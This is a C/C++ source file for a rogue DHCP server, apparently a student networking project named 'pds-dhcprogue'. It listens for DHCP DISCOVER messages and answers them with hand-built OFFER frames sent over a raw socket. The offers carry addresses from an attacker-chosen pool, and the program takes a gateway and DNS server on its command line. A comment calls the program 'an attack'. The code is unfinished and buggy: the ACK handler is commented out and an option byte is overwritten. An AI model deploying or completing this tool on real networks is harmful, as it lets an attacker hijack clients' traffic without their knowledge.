#include "pds-dhcprogue.h"

void help(){
  printf("HELP\n");
}

/**
* Eror message wrapper
*/
void err(string msg, int erno, short show_help){
  fprintf(stderr, "%s\n", msg.c_str());
  if (show_help) help();
  exit(erno);
}

/**
* Universal function for memory allocation checking
*/
void check_null(void * lel){
  if (lel == NULL) err("Memory allocation failure", ERR, 0);
}

/**
* Check if string really contains ip address and convert to uint32_t
*/
uint32_t str_to_ip(const char* addr){
  struct in_addr tmp;
  if ((inet_pton(AF_INET, addr, &tmp)) != 1) {
    err("inet_pton failed", ERR, 0);
  }
  return tmp.s_addr;
}

/**
* Check ip address and convert to c_string
*/
char* ip_to_str(uint32_t addr){
  char* buffer = (char *)malloc(INET_ADDRSTRLEN);
  check_null(buffer);
  // init struct required by init_ntop
  struct in_addr tmp;
  tmp.s_addr = addr;
  // check address and convert to string
  if (inet_ntop(AF_INET, &tmp, buffer, INET6_ADDRSTRLEN) == NULL) {
    free(buffer);
    err("inet_ntop faild", ERR, 0);
  }
  return buffer;
}


void fill_range(struct ip_pool* p) {
  for (uint32_t i = p->ip_first; i <= p->ip_last; i=htonl(htonl(i)+1)) {
    p->ip_pool.push_back(i);
  }
  if (p->ip_pool.empty()) {
    err("Empty pool of free ip adresses", ERR, 0);
  }
  p->ip_next = p->ip_first;   // assign first usable ip address
}

void parse_pool(struct ip_pool* p, char* arg) {
  int delim = 0;
  for (size_t i = 0; i < strlen(arg); i++) {
    if (arg[i] == '-') {  // find delimiter so we know where to split
      delim = i;
      break;
    }
  }
  if (!delim) { // make sure that delimiter was parsed
    err("Could not parse pool", ERR, 1);
  }
  char* start = (char*)malloc(delim);
  check_null(start);
  char* end = (char*)malloc(strlen(arg)-delim-1);
  check_null(end);
  // divide andresses and copy them to own arrays
  memcpy(start, arg, delim);
  memcpy(end, arg+delim+1, strlen(arg)-delim);
  // convert the arrays to ip addresses and assign them to pool
  p->ip_first = str_to_ip(start);
  p->ip_last = str_to_ip(end);
  // memory is precious
  free(start);
  free(end);
  // fill the pool with ip addreses
  fill_range(p);
}

struct ip_pool* check_args(int argc, char **argv){
  struct ip_pool* p = (struct ip_pool*) malloc(sizeof(struct ip_pool));
  check_null(p);
  if (argc != 13) {
    err("Arguments not recognized", ERR, 1);
  }
  char c;
  while ((c = getopt (argc, argv, "i:p:g:n:d:l:")) != -1){
    switch (c) {
      case 'i':
        p->interface = string(optarg);
        break;
      case 'p':
        parse_pool(p, optarg);
        break;
      case 'g':
        p->ip_gateway = str_to_ip(optarg);
        break;
      case 'n':
        p->ip_dns = str_to_ip(optarg);
        break;
      case 'd':
        p->domain = string(optarg);
        break;
      case 'l':
        p->lease_time = string(optarg);
        break;
      default:
        break;
    }
  }
  return p;
}
/**
* Compute the checksum, inspired by rfc1071 and
* https://www.thegeekstuff.com/2012/05/ip-header-checksum
*/
void checksum(struct ip *hdr, int len){
  int sum = 0;
  hdr->ip_sum = sum;
  uint16_t* word = (uint16_t*)hdr;

  while (len > 1){
    sum += *word++;
    len -= 2;
  }
  if (len == 1){  // add leftover byte
    uint8_t answer = *(u_char *)word;
    sum += answer;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  hdr->ip_sum = ~sum;
}

/**
* Allocate and fill udp header
*/
struct udphdr* get_udp_header(){
  struct udphdr* udp_header = (struct udphdr*)malloc(sizeof(struct udphdr));
  check_null(udp_header);

  udp_header->source = htons(DHCP_SRC_PORT); // Fill ports
  udp_header->dest = htons(DHCP_DST_PORT);
  udp_header->check = 0 ; // checksum is not compulsory for udp in ip_v4
  udp_header->len = htons(DHCP_BUFFER_SIZE + UDP_HEADER_LEN);
  return udp_header;
}

/**
* Create, allocate and fill necessary values to ip header
*/
struct ip* get_ip_header(uint32_t ip_dest){
  struct ip* hdr = (struct ip*)malloc(sizeof(struct ip));
  check_null(hdr);

  hdr->ip_hl = 5;               // 5 bytes
  hdr->ip_v = 4;                // version 4
  hdr->ip_tos = 0;              // best effort
  hdr->ip_off = 0;              // no fragmentation
  hdr->ip_id = htons(random()); // random blob
  hdr->ip_ttl = 255;            // 255, why not it's an attack
  hdr->ip_p = IPPROTO_UDP;      // udp, RFC constant
  hdr->ip_len = htons(DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN);
  // fill interface ip address as source address
  inet_pton(AF_INET, ip_to_str(p->int_ip_address), &hdr->ip_src);
  inet_pton(AF_INET, ip_to_str(ip_dest), &hdr->ip_dst);
  checksum(hdr,IP4_HEADER_LEN);
  return hdr;
}
void send_ack(unsigned char *msg);

uint32_t lease_ip(uint8_t* dst_mac_addr){
  struct pool_item item;   // write to lease list
  memcpy(item.mac_addr, dst_mac_addr, MAC_ADDR_LEN);
  item.ip_addr = p->ip_next;
  // TODO item.lease_end = mktime(timeinfo);
  p->leased_list.insert(p->leased_list.begin(), item);
  // if (print) {
  //   printf("%s %s \n", chaddr_str, ip_to_str(item.ip_addr));
  // }
  // Remove taken address and prepare nectone
  p->ip_pool.erase(remove(p->ip_pool.begin(), p->ip_pool.end(), p->ip_next));
  p->ip_next = p->ip_pool.front();
  return item.ip_addr;
}

void write_ip(unsigned char *buffer, uint32_t ip){
  for (int i = 0; i < 4; i++) {
    buffer[i] = (ip >> (i*8)) & 0xFF;
  }
}

void make_offer(unsigned char* msg, uint32_t client_ip){
  // change only required parts of received DHCP message
  msg[0] = (int) 2;                // DHCP REPLY
  write_ip(&msg[16], client_ip);
  write_ip(&msg[20], p->int_ip_address);
  msg[240] = (int) 53;             // OPTION defining dhcp message type
  msg[241] = (int) 1;              // length of ^
  msg[242] = (int) DHCP_OFFER;     // 1 == discover
  msg[243] = (int) 55;             // OPTION Requested items
  msg[244] = (int) 4;              // length of ^
  msg[245] = (int) 1;              // Subnet mask
  msg[246] = (int) 28;             // Broadcast
  msg[247] = (int) 3;              // Router
  msg[248] = (int) 15;             // Domain name
  msg[243] = (int) 255;            //end
}


void offer(unsigned char *msg){
  uint8_t dst_mac_addr[MAC_ADDR_LEN];
  memcpy(dst_mac_addr, &msg[28], MAC_ADDR_LEN);

  struct sockaddr_ll interface;
  // setup interface, see "man packet"
  bzero(&interface, sizeof(interface));
  // get interface index
  if((interface.sll_ifindex = if_nametoindex(p->interface.c_str())) == 0){
    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
  }
  interface.sll_family = AF_PACKET;   // setup interface, see "man packet"
  interface.sll_halen = ETH_ALEN;
  interface.sll_protocol = htons(ETH_P_802_3);
  memcpy(interface.sll_addr, p->int_mac_address, MAC_ADDR_LEN * sizeof(uint8_t));

  int eth_msg_len = DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN + ETH_HEADER_LEN;
  unsigned char* eth_frame = (unsigned char*)malloc(eth_msg_len);
  check_null(eth_frame);

  memcpy(eth_frame, dst_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
  memcpy(eth_frame + MAC_ADDR_LEN, p->int_mac_address, MAC_ADDR_LEN * sizeof(uint8_t));
  eth_frame[12] = 0x08; // ETH_P_IP value
  eth_frame[13] = 0x00;
  // L2 ends here ^ Add IP (L3) and UDP (L4) headers next...
  uint32_t client_ip_addr = lease_ip(dst_mac_addr);

  struct ip* ip_header = get_ip_header(client_ip_addr);
  struct udphdr* udp_header = get_udp_header();

  memcpy(eth_frame + ETH_HEADER_LEN, ip_header, IP4_HEADER_LEN * sizeof(uint8_t));
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));

  make_offer(msg, client_ip_addr);
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, msg, DHCP_BUFFER_SIZE * sizeof(uint8_t));
  // fire
  int sent = 0;
  if ((sent = sendto(send_socket, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0){
    err("sendto() failed", sent, 0);
  }
  free(eth_frame);
}

void dhcp() {
  unsigned char msg[DHCP_BUFFER_SIZE];
  bzero(&msg, DHCP_BUFFER_SIZE);
  struct sockaddr_ll interface;
  // setup interface, see "man packet"
  bzero(&interface, sizeof(interface));
  // get interface index
  if((interface.sll_ifindex = if_nametoindex(p->interface.c_str())) == 0){
    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
  }
  interface.sll_family = AF_PACKET;   // setup interface, see "man packet"
  interface.sll_halen = ETH_ALEN;
  interface.sll_protocol = htons(ETH_P_802_3);
  socklen_t length = sizeof(interface);
  int rcvd = 0; // receive data and decive what to do
  while((rcvd = recvfrom(listen_socket, msg, DHCP_BUFFER_SIZE, 0, (struct sockaddr *)&interface, &length)) >= 0)
  {
    switch (msg[242]) {
      case (int) DHCP_DISCOVER:
        printf("DISCOVER\n");
        offer(msg);
        break;
      case (int) DHCP_REQUEST:
        //send_ack(msg);
        break;
      // case (int) DHCP_RELEASE:
      //   release(msg);
        break;
      default: break;
    }
    bzero(msg,DHCP_BUFFER_SIZE);
  }
}
/**
* Get mac, ip, netmask configured on interface, ref. man ioctl
*/
void get_interface_info(){
  // determine device mac adress required fo L2 header
  struct ifreq ifr;
  bzero(&ifr, sizeof(ifr));
  memcpy(ifr.ifr_name, p->interface.c_str(), strlen(p->interface.c_str()));
  // get MAC address
  if(ioctl(send_socket, SIOCGIFHWADDR, &ifr) < 0){
    err("ioctl failed, cannot determine interface's MAC address", ERR, 0);
  }
  // same for device ip address for L3 header - ip address
  if(ioctl(send_socket, SIOCGIFADDR, &ifr) < 0){
    err("ioctl failed, cannot determine interface's IP address", ERR, 0);
  }
  // get network mask
  if (ioctl(send_socket, SIOCGIFNETMASK, &ifr) < 0){
    err("ioctl failed, cannot determine interface's network mask", ERR, 0);
  }
  // collect the information for future use
  memcpy(p->int_mac_address, ifr.ifr_hwaddr.sa_data, 6 * sizeof(uint8_t));
  p->int_ip_address = str_to_ip(inet_ntoa((((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr)));
  p->int_ip_netmask = str_to_ip(inet_ntoa((((struct sockaddr_in *)&(ifr.ifr_netmask))->sin_addr)));
}

void server_start() {
  // creating one additional socket that server will listen on to detect and
  // parse DHCP DISCOVER which have all required information
  if((listen_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
    err ("Failed to create SOCK_DGRAM", listen_socket, 0);
  }
  struct sockaddr_in srv;
  bzero(&srv, sizeof(srv));
  srv.sin_family = AF_INET;
  srv.sin_addr.s_addr = INADDR_ANY;     // dont care
  srv.sin_port = htons(DHCP_SRC_PORT);  // 67

  if((bind(listen_socket, (struct sockaddr *)&srv, sizeof(srv))) != 0){
    err ("Failed to bind listen socket", listen_socket, 0);
  }
  // // setup second raw socket for sending, so we can use L2 unicast
  if ((send_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
    err ("Failed to create SOCK_RAW", send_socket, 0);
  }
  // get MAC address, ip_address and netmask
  get_interface_info();
  // all set, continue
  dhcp();
}

void cleanup() {
  if (p)              free(p);
  if (send_socket)    close(send_socket);
  if (listen_socket)  close(send_socket);
}

int main(int argc, char **argv) {
  p = check_args(argc, argv);
  srand(time(NULL));
  server_start();
  // TO DO sighandler
  cleanup();
  return 0;
}
